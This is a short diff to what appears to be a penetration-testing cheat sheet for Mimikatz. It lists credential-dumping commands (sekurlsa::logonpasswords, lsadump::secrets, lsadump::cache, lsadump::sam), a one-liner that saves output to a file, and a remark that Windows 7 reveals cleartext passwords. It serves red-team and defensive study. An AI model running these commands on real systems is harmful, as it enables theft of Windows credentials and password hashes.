@@ -10,7 +10,14 @@ sekurlsa::logonpasswords
 # Automating:
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
 
+# Extract secrets and cache:  
+lsadump::secrets
+lsadump::cache
+
 # Extract only NTLM hashes from SAM:
 lsadump::sam
 
 On older operating systems like Windows 7 WDigest11 is enabled. running Mimikatz will reveal cleartext passwords.
+
+# Usage:
+https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099
